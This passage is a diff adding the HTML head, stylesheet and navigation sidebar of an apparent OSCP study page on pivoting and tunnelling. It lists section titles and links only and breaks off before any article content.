@@ -1,0 +1,1691 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="color-scheme" content="light"><title>Reach internal services — OSCP Reference</title><meta name="description" content="Plain OSCP reference: commands, explanations, interpretation and next checks."><link rel="canonical" href="https://armaanleg3nd.github.io/oscp/notes/methods/pivoting/"><style>:root{color-scheme:light}html{color:#000;background:#fff;scroll-padding-top:1rem}body{margin:0;font:17px/1.5 Times New Roman,Times,serif}a,a:visited{color:#00e;text-decoration:underline}a:focus-visible,summary:focus-visible{outline-offset:3px;outline:2px solid #000}#reference-index{box-sizing:border-box;background:#fff;border-right:1px solid #888;width:19rem;padding:.75rem 1rem;position:fixed;inset:0 auto 0 0;overflow:auto}#reference-index>p:first-child{margin-top:0}nav{overflow-wrap:anywhere;font-size:15px;line-height:1.4}nav ul{margin:.35rem 0;padding-left:1.15rem}nav>ul{padding-left:1rem}nav li{margin:.3rem 0}nav summary{cursor:pointer}nav [aria-current=page]{font-weight:700}main{min-width:0;margin-left:19rem;padding:1rem 2rem 3rem}article{overflow-wrap:anywhere;min-width:0;max-width:85ch}h1{font-size:2em;line-height:1.15}h2{margin-top:1.7em;font-size:1.5em}h3{margin-top:1.5em;font-size:1.2em}h4,h5,h6{margin-top:1.3em;font-size:1em}pre,code{font-family:Courier New,Courier,monospace;font-size:.9em}pre{white-space:pre;overflow-wrap:normal;background:#f5f5f5;border:1px solid #aaa;padding:.7rem;overflow-x:auto}table{border-collapse:collapse;max-width:100%;margin:1rem 0;display:block;overflow-x:auto}th,td{vertical-align:top;text-align:left;border:1px solid #aaa;padding:.35rem .55rem}th{background:#eee}blockquote{border-left:2px solid #aaa;margin-left:0;padding-left:1rem}img,svg{max-width:100%;height:auto}article details{margin:1rem 0}article summary{cursor:pointer}.skip{z-index:2;background:#fff;padding:.5rem;position:fixed;top:0;left:-10000px}.skip:focus{left:0}@media (width<=700px){html{scroll-padding-top:calc(32dvh + 1rem)}#reference-index{z-index:1;border-bottom:1px solid #888;border-right:0;width:100%;height:32dvh;inset:0 0 auto}main{margin-left:0;padding:calc(32dvh + 1rem) 1rem 2rem}body{font-size:16px}}
+</style></head><body><a class="skip" href="#document">Skip to document</a><aside id="reference-index"><p><strong><a href="/oscp/">OSCP Reference</a></strong></p><nav aria-label="Reference index"><p><a href="/oscp/notes/ad-investigation/">AD Notes</a> · <a href="/oscp/notes/ad-investigation/quick-reference/">AD quick reference</a></p><details open><summary>On this page</summary><ul><li><a href="/oscp/notes/methods/pivoting/#first-pass-tools-and-findings">First pass: tools and findings</a><ul><li><a href="/oscp/notes/methods/pivoting/#enumerate-what-the-pivot-can-actually-reach">Enumerate what the pivot can actually reach</a></li><li><a href="/oscp/notes/methods/pivoting/#use-ssh-forwarding-for-the-required-direction">Use SSH forwarding for the required direction</a></li><li><a href="/oscp/notes/methods/pivoting/#use-ligolo-for-a-justified-routed-requirement">Use Ligolo for a justified routed requirement</a></li></ul></li><li><a href="/oscp/notes/methods/pivoting/#discovery-workflow">Discovery workflow</a></li><li><a href="/oscp/notes/methods/pivoting/#method-families">Method families</a></li><li><a href="/oscp/notes/methods/pivoting/#choose-a-method">Choose a method</a></li><li><a href="/oscp/notes/methods/pivoting/#discover-pivot-interfaces-routes-and-internal-service-context">Discover pivot interfaces, routes and internal service context</a><ul><li><a href="/oscp/notes/methods/pivoting/#1-purpose-and-result">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/pivoting/#2-recognition-clues">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/pivoting/#find-the-clue-from-your-starting-access">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/pivoting/#3-prerequisites">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/pivoting/#4-discover-and-verify-prerequisites">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/pivoting/#5-why-it-works">5. Why it works</a></li><li><a href="/oscp/notes/methods/pivoting/#6-execute-and-choose-variants">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/pivoting/#7-worked-example--hypothetical">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/pivoting/#8-verify-the-result">8. Verify the result</a></li><li><a href="/oscp/notes/methods/pivoting/#9-failure-and-fallback">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/pivoting/#10-next-transitions">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/pivoting/#relay-a-single-tcp-service-through-a-fixed-forward">Relay a single TCP service through a fixed forward</a><ul><li><a href="/oscp/notes/methods/pivoting/#1-purpose-and-result-1">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/pivoting/#2-recognition-clues-1">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/pivoting/#find-the-clue-from-your-starting-access-1">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/pivoting/#3-prerequisites-1">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/pivoting/#4-discover-and-verify-prerequisites-1">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/pivoting/#5-why-it-works-1">5. Why it works</a></li><li><a href="/oscp/notes/methods/pivoting/#6-execute-and-choose-variants-1">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/pivoting/#7-worked-example--hypothetical-1">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/pivoting/#8-verify-the-result-1">8. Verify the result</a></li><li><a href="/oscp/notes/methods/pivoting/#9-failure-and-fallback-1">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/pivoting/#10-next-transitions-1">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/pivoting/#forward-a-selected-service-through-an-ssh-client-side-listener">Forward a selected service through an SSH client-side listener</a><ul><li><a href="/oscp/notes/methods/pivoting/#1-purpose-and-result-2">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/pivoting/#2-recognition-clues-2">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/pivoting/#find-the-clue-from-your-starting-access-2">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/pivoting/#3-prerequisites-2">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/pivoting/#4-discover-and-verify-prerequisites-2">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/pivoting/#5-why-it-works-2">5. Why it works</a></li><li><a href="/oscp/notes/methods/pivoting/#6-execute-and-choose-variants-2">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/pivoting/#7-worked-example--hypothetical-2">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/pivoting/#8-verify-the-result-2">8. Verify the result</a></li><li><a href="/oscp/notes/methods/pivoting/#9-failure-and-fallback-2">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/pivoting/#10-next-transitions-2">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/pivoting/#provide-socks-access-through-ssh-dynamic-forwarding">Provide SOCKS access through SSH dynamic forwarding</a><ul><li><a href="/oscp/notes/methods/pivoting/#1-purpose-and-result-3">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/pivoting/#2-recognition-clues-3">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/pivoting/#find-the-clue-from-your-starting-access-3">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/pivoting/#3-prerequisites-3">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/pivoting/#4-discover-and-verify-prerequisites-3">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/pivoting/#5-why-it-works-3">5. Why it works</a></li><li><a href="/oscp/notes/methods/pivoting/#6-execute-and-choose-variants-3">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/pivoting/#7-worked-example--hypothetical-3">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/pivoting/#8-verify-the-result-3">8. Verify the result</a></li><li><a href="/oscp/notes/methods/pivoting/#9-failure-and-fallback-3">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/pivoting/#10-next-transitions-3">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/pivoting/#expose-an-ssh-client-side-destination-through-a-server-side-remote-listener">Expose an SSH-client-side destination through a server-side remote listener</a><ul><li><a href="/oscp/notes/methods/pivoting/#1-purpose-and-result-4">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/pivoting/#2-recognition-clues-4">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/pivoting/#find-the-clue-from-your-starting-access-4">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/pivoting/#3-prerequisites-4">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/pivoting/#4-discover-and-verify-prerequisites-4">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/pivoting/#5-why-it-works-4">5. Why it works</a></li><li><a href="/oscp/notes/methods/pivoting/#6-execute-and-choose-variants-4">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/pivoting/#7-worked-example--hypothetical-4">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/pivoting/#8-verify-the-result-4">8. Verify the result</a></li><li><a href="/oscp/notes/methods/pivoting/#9-failure-and-fallback-4">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/pivoting/#10-next-transitions-4">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/pivoting/#expose-a-server-side-socks-proxy-through-remote-dynamic-ssh-forwarding">Expose a server-side SOCKS proxy through remote dynamic SSH forwarding</a><ul><li><a href="/oscp/notes/methods/pivoting/#1-purpose-and-result-5">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/pivoting/#2-recognition-clues-5">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/pivoting/#find-the-clue-from-your-starting-access-5">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/pivoting/#3-prerequisites-5">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/pivoting/#4-discover-and-verify-prerequisites-5">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/pivoting/#5-why-it-works-5">5. Why it works</a></li><li><a href="/oscp/notes/methods/pivoting/#6-execute-and-choose-variants-5">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/pivoting/#7-worked-example--hypothetical-5">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/pivoting/#8-verify-the-result-5">8. Verify the result</a></li><li><a href="/oscp/notes/methods/pivoting/#9-failure-and-fallback-5">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/pivoting/#10-next-transitions-5">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/pivoting/#use-proxychains-native-socks-clients-and-ssh-jump-paths-appropriately">Use ProxyChains, native SOCKS clients and SSH jump paths appropriately</a><ul><li><a href="/oscp/notes/methods/pivoting/#1-purpose-and-result-6">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/pivoting/#2-recognition-clues-6">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/pivoting/#find-the-clue-from-your-starting-access-6">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/pivoting/#3-prerequisites-6">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/pivoting/#4-discover-and-verify-prerequisites-6">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/pivoting/#5-why-it-works-6">5. Why it works</a></li><li><a href="/oscp/notes/methods/pivoting/#6-execute-and-choose-variants-6">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/pivoting/#7-worked-example--hypothetical-6">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/pivoting/#8-verify-the-result-6">8. Verify the result</a></li><li><a href="/oscp/notes/methods/pivoting/#9-failure-and-fallback-6">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/pivoting/#10-next-transitions-6">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/pivoting/#route-a-selected-subnet-through-sshuttle">Route a selected subnet through sshuttle</a><ul><li><a href="/oscp/notes/methods/pivoting/#1-purpose-and-result-7">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/pivoting/#2-recognition-clues-7">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/pivoting/#find-the-clue-from-your-starting-access-7">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/pivoting/#3-prerequisites-7">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/pivoting/#4-discover-and-verify-prerequisites-7">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/pivoting/#5-why-it-works-7">5. Why it works</a></li><li><a href="/oscp/notes/methods/pivoting/#6-execute-and-choose-variants-7">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/pivoting/#7-worked-example--hypothetical-7">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/pivoting/#8-verify-the-result-7">8. Verify the result</a></li><li><a href="/oscp/notes/methods/pivoting/#9-failure-and-fallback-7">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/pivoting/#10-next-transitions-7">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/pivoting/#forward-from-windows-with-openssh-plink-or-netsh">Forward from Windows with OpenSSH, Plink or Netsh</a><ul><li><a href="/oscp/notes/methods/pivoting/#1-purpose-and-result-8">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/pivoting/#2-recognition-clues-8">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/pivoting/#find-the-clue-from-your-starting-access-8">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/pivoting/#3-prerequisites-8">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/pivoting/#4-discover-and-verify-prerequisites-8">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/pivoting/#5-why-it-works-8">5. Why it works</a></li><li><a href="/oscp/notes/methods/pivoting/#6-execute-and-choose-variants-8">6. Execute and choose variants</a><ul><li><a href="/oscp/notes/methods/pivoting/#81-built-in-openssh-client">8.1 Built-in OpenSSH client</a></li><li><a href="/oscp/notes/methods/pivoting/#82-plink">8.2 Plink</a></li><li><a href="/oscp/notes/methods/pivoting/#83-netsh-portproxy">8.3 Netsh portproxy</a></li></ul></li><li><a href="/oscp/notes/methods/pivoting/#7-worked-example--hypothetical-8">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/pivoting/#8-verify-the-result-8">8. Verify the result</a></li><li><a href="/oscp/notes/methods/pivoting/#9-failure-and-fallback-8">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/pivoting/#10-next-transitions-8">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/pivoting/#use-a-reverse-chisel-socks-or-fixed-tcp-tunnel">Use a reverse Chisel SOCKS or fixed TCP tunnel</a><ul><li><a href="/oscp/notes/methods/pivoting/#1-purpose-and-result-9">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/pivoting/#2-recognition-clues-9">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/pivoting/#find-the-clue-from-your-starting-access-9">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/pivoting/#3-prerequisites-9">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/pivoting/#4-discover-and-verify-prerequisites-9">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/pivoting/#5-why-it-works-9">5. Why it works</a></li><li><a href="/oscp/notes/methods/pivoting/#6-execute-and-choose-variants-9">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/pivoting/#7-worked-example--hypothetical-9">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/pivoting/#8-verify-the-result-9">8. Verify the result</a></li><li><a href="/oscp/notes/methods/pivoting/#9-failure-and-fallback-9">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/pivoting/#10-next-transitions-9">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/pivoting/#use-forward-chisel-socks-and-version-supported-udp-routing">Use forward Chisel SOCKS and version-supported UDP routing</a><ul><li><a href="/oscp/notes/methods/pivoting/#1-purpose-and-result-10">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/pivoting/#2-recognition-clues-10">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/pivoting/#find-the-clue-from-your-starting-access-10">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/pivoting/#3-prerequisites-10">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/pivoting/#4-discover-and-verify-prerequisites-10">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/pivoting/#5-why-it-works-10">5. Why it works</a></li><li><a href="/oscp/notes/methods/pivoting/#6-execute-and-choose-variants-10">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/pivoting/#7-worked-example--hypothetical-10">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/pivoting/#8-verify-the-result-10">8. Verify the result</a></li><li><a href="/oscp/notes/methods/pivoting/#9-failure-and-fallback-10">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/pivoting/#10-next-transitions-10">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/pivoting/#route-a-selected-internal-subnet-through-ligolo-ng">Route a selected internal subnet through Ligolo-ng</a><ul><li><a href="/oscp/notes/methods/pivoting/#1-purpose-and-result-11">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/pivoting/#2-recognition-clues-11">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/pivoting/#find-the-clue-from-your-starting-access-11">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/pivoting/#3-prerequisites-11">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/pivoting/#4-discover-and-verify-prerequisites-11">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/pivoting/#5-why-it-works-11">5. Why it works</a></li><li><a href="/oscp/notes/methods/pivoting/#6-execute-and-choose-variants-11">6. Execute and choose variants</a><ul><li><a href="/oscp/notes/methods/pivoting/#101-proxy-and-agent">10.1 Proxy and agent</a></li><li><a href="/oscp/notes/methods/pivoting/#102-current-managed-interface-and-route">10.2 Current managed interface and route</a></li><li><a href="/oscp/notes/methods/pivoting/#103-pivot-loopback-services">10.3 Pivot loopback services</a></li><li><a href="/oscp/notes/methods/pivoting/#104-callback-or-file-server-listener-on-the-agent">10.4 Callback or file-server listener on the agent</a></li></ul></li><li><a href="/oscp/notes/methods/pivoting/#7-worked-example--hypothetical-11">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/pivoting/#8-verify-the-result-11">8. Verify the result</a></li><li><a href="/oscp/notes/methods/pivoting/#9-failure-and-fallback-11">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/pivoting/#10-next-transitions-11">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/pivoting/#conditional-tunnel-through-controlled-dns-infrastructure">Conditional: tunnel through controlled DNS infrastructure</a><ul><li><a href="/oscp/notes/methods/pivoting/#1-purpose-and-result-12">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/pivoting/#2-recognition-clues-12">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/pivoting/#find-the-clue-from-your-starting-access-12">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/pivoting/#3-prerequisites-12">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/pivoting/#4-discover-and-verify-prerequisites-12">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/pivoting/#5-why-it-works-12">5. Why it works</a></li><li><a href="/oscp/notes/methods/pivoting/#6-execute-and-choose-variants-12">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/pivoting/#7-worked-example--hypothetical-12">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/pivoting/#8-verify-the-result-12">8. Verify the result</a></li><li><a href="/oscp/notes/methods/pivoting/#9-failure-and-fallback-12">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/pivoting/#10-next-transitions-12">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/pivoting/#preserve-dns-kerberos-names-and-time-across-a-pivot">Preserve DNS, Kerberos names and time across a pivot</a><ul><li><a href="/oscp/notes/methods/pivoting/#1-purpose-and-result-13">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/pivoting/#2-recognition-clues-13">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/pivoting/#find-the-clue-from-your-starting-access-13">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/pivoting/#3-prerequisites-13">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/pivoting/#4-discover-and-verify-prerequisites-13">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/pivoting/#5-why-it-works-13">5. Why it works</a></li><li><a href="/oscp/notes/methods/pivoting/#6-execute-and-choose-variants-13">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/pivoting/#7-worked-example--hypothetical-13">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/pivoting/#8-verify-the-result-13">8. Verify the result</a></li><li><a href="/oscp/notes/methods/pivoting/#9-failure-and-fallback-13">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/pivoting/#10-next-transitions-13">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/pivoting/#build-the-callback-and-delivery-routes-separately-from-the-attack-route">Build the callback and delivery routes separately from the attack route</a><ul><li><a href="/oscp/notes/methods/pivoting/#1-purpose-and-result-14">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/pivoting/#2-recognition-clues-14">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/pivoting/#find-the-clue-from-your-starting-access-14">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/pivoting/#3-prerequisites-14">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/pivoting/#4-discover-and-verify-prerequisites-14">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/pivoting/#5-why-it-works-14">5. Why it works</a></li><li><a href="/oscp/notes/methods/pivoting/#6-execute-and-choose-variants-14">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/pivoting/#7-worked-example--hypothetical-14">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/pivoting/#8-verify-the-result-14">8. Verify the result</a></li><li><a href="/oscp/notes/methods/pivoting/#9-failure-and-fallback-14">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/pivoting/#10-next-transitions-14">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/pivoting/#compose-multiple-pivots-and-validate-every-connection-leg">Compose multiple pivots and validate every connection leg</a><ul><li><a href="/oscp/notes/methods/pivoting/#1-purpose-and-result-15">1. Purpose and result</a></li><li><a href="/oscp/notes/methods/pivoting/#2-recognition-clues-15">2. Recognition clues</a><ul><li><a href="/oscp/notes/methods/pivoting/#find-the-clue-from-your-starting-access-15">Find the clue from your starting access</a></li></ul></li><li><a href="/oscp/notes/methods/pivoting/#3-prerequisites-15">3. Prerequisites</a></li><li><a href="/oscp/notes/methods/pivoting/#4-discover-and-verify-prerequisites-15">4. Discover and verify prerequisites</a></li><li><a href="/oscp/notes/methods/pivoting/#5-why-it-works-15">5. Why it works</a></li><li><a href="/oscp/notes/methods/pivoting/#6-execute-and-choose-variants-15">6. Execute and choose variants</a></li><li><a href="/oscp/notes/methods/pivoting/#7-worked-example--hypothetical-15">7. Worked example — hypothetical</a></li><li><a href="/oscp/notes/methods/pivoting/#8-verify-the-result-15">8. Verify the result</a></li><li><a href="/oscp/notes/methods/pivoting/#9-failure-and-fallback-15">9. Failure and fallback</a></li><li><a href="/oscp/notes/methods/pivoting/#10-next-transitions-15">10. Next transitions</a></li></ul></li><li><a href="/oscp/notes/methods/pivoting/#sources-and-shared-concepts">Sources and shared concepts</a></li></ul></details><ul><li><details><summary>Operational procedures</summary><ul><li><details><summary><a href="/oscp/reference/01-discovery-scanning/">01 — Discovery and scanning</a></summary><ul><li><a href="/oscp/reference/01-discovery-scanning/01-path-and-host-discovery/">Path and Host Discovery</a></li><li><a href="/oscp/reference/01-discovery-scanning/02-tcp-scanning/">TCP Scanning</a></li><li><a href="/oscp/reference/01-discovery-scanning/03-service-identification/">Service Identification</a></li><li><a href="/oscp/reference/01-discovery-scanning/04-udp-scanning/">UDP Scanning</a></li><li><a href="/oscp/reference/01-discovery-scanning/05-results-and-next-actions/">Scan Results and Next Actions</a></li><li><a href="/oscp/reference/01-discovery-scanning/06-windows-network-checks/">Windows Network Checks</a></li><li><a href="/oscp/reference/01-discovery-scanning/07-scanner-alternatives/">Scanner Alternatives and Web Baseline Checks</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/02-service-enumeration/">02 — Service enumeration</a></summary><ul><li><a href="/oscp/reference/02-service-enumeration/01-ftp/">FTP Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/02-ssh/">SSH Enumeration and Access Validation</a></li><li><a href="/oscp/reference/02-service-enumeration/03-smtp/">SMTP Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/04-dns/">DNS Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/05-nfs-rpc/">NFS and Unix RPC Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/06-smb-rpc/">SMB and MS-RPC Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/07-snmp/">SNMP Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/08-databases/">Database Enumeration and Privilege Boundaries</a></li><li><a href="/oscp/reference/02-service-enumeration/09-windows-remote-access/">Windows Remote-Access Validation</a></li><li><a href="/oscp/reference/02-service-enumeration/10-http-web-mapping/">HTTP and Web Application Mapping</a></li><li><a href="/oscp/reference/02-service-enumeration/11-ldap-kerberos/">LDAP and Kerberos Enumeration</a></li><li><a href="/oscp/reference/02-service-enumeration/12-sip-irc/">SIP and IRC Triage</a></li><li><a href="/oscp/reference/02-service-enumeration/13-memcached-webdav/">Memcached and WebDAV</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/03-initial-access/">03 — Initial access</a></summary><ul><li><a href="/oscp/reference/03-initial-access/01-rdp-access/">RDP Access</a></li><li><a href="/oscp/reference/03-initial-access/02-web-file-handling/">Web File Read, Inclusion and Upload Paths</a></li><li><a href="/oscp/reference/03-initial-access/03-command-and-sql-injection/">Command and Manual SQL Injection</a></li><li><a href="/oscp/reference/03-initial-access/04-access-control-and-xss/">Web Access Control, API Logic and XSS</a></li><li><a href="/oscp/reference/03-initial-access/05-wordpress-and-ssrf/">WordPress and SSRF Paths</a></li><li><a href="/oscp/reference/03-initial-access/06-public-exploit-adaptation/">Public Exploit Selection and Adaptation</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/04-shells-transfers-credentials/">04 — Shells, transfers and credentials</a></summary><ul><li><a href="/oscp/reference/04-shells-transfers-credentials/01-file-transfer/">File Transfer</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/02-shells-and-payloads/">Shells, Payloads and Session Repair</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/">Credential Classification, Cracking and Reuse</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/04-file-and-repository-hunting/">File and Repository Hunting</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/05-python-tool-environments/">Python Tool Environments</a></li><li><a href="/oscp/reference/04-shells-transfers-credentials/06-payload-execution-obstacles/">Payload Execution Obstacles</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/05-local-privilege-escalation/">05 — Local privilege escalation</a></summary><ul><li><a href="/oscp/reference/05-local-privilege-escalation/01-linux-privilege-escalation/">Linux Privilege Escalation</a></li><li><a href="/oscp/reference/05-local-privilege-escalation/02-windows-privilege-escalation/">Windows Privilege Escalation</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/06-ad-lateral-movement/">06 — AD and lateral movement</a></summary><ul><li><a href="/oscp/reference/06-ad-lateral-movement/01-domain-mapping/">Active Directory Domain Mapping</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/02-credential-access/">Windows and Domain Credential Access</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/03-kerberos-and-identity-transitions/">Kerberos and Identity Transitions</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/04-object-control-adcs-and-domain-compromise/">Object Control, AD CS and Domain Compromise</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/05-lateral-movement/">Lateral Movement</a></li><li><a href="/oscp/reference/06-ad-lateral-movement/06-conditional-infrastructure-and-trusts/">Conditional AD infrastructure and trust checks</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/07-pivoting-tunneling/">07 — Pivoting and tunneling</a></summary><ul><li><a href="/oscp/reference/07-pivoting-tunneling/01-tunneling-and-port-forwarding/">Tunneling and Port Forwarding</a></li></ul></details></li><li><details><summary><a href="/oscp/reference/08-evidence-reporting/">08 — Evidence and reporting</a></summary><ul><li><a href="/oscp/reference/08-evidence-reporting/01-attack-tracking-and-evidence/">Integrated Attack Tracking and Evidence</a></li></ul></details></li><li><a href="/oscp/reference/INDEX/">Complete operational task index</a></li></ul></details></li><li><details><summary><a href="/oscp/cheatsheets/">Cheatsheets</a></summary><ul><li><a href="/oscp/cheatsheets/active-directory/">Active Directory Cheatsheet</a></li><li><a href="/oscp/cheatsheets/ad-investigation/">AD Investigation — Where to Look and What Output Means</a></li><li><a href="/oscp/cheatsheets/credentials-cracking/">Credentials and Cracking Cheatsheet</a></li><li><a href="/oscp/cheatsheets/discovery-scanning/">Discovery and Scanning Cheatsheet</a></li><li><a href="/oscp/cheatsheets/evidence-reporting/">Integrated Attack and Reporting Cheatsheet</a></li><li><a href="/oscp/cheatsheets/linux-privesc/">Linux Privilege Escalation 